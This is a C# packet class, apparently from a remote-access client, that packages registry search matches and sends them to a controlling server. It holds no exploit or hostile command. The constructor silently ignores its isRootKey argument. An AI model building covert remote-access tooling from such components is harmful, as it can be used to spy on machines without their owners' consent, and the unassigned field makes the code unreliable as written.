﻿using System;
using xClient.Core.Networking;
using xClient.Core.Registry;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetRegistryKeysResponse : IPacket
    {
        public RegSeekerMatch[] Matches { get; set; }

        public bool IsRootKey { get; set; }

        public GetRegistryKeysResponse()
        { }

        public GetRegistryKeysResponse(RegSeekerMatch[] matches, bool isRootKey = false)
        {
            Matches = matches;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}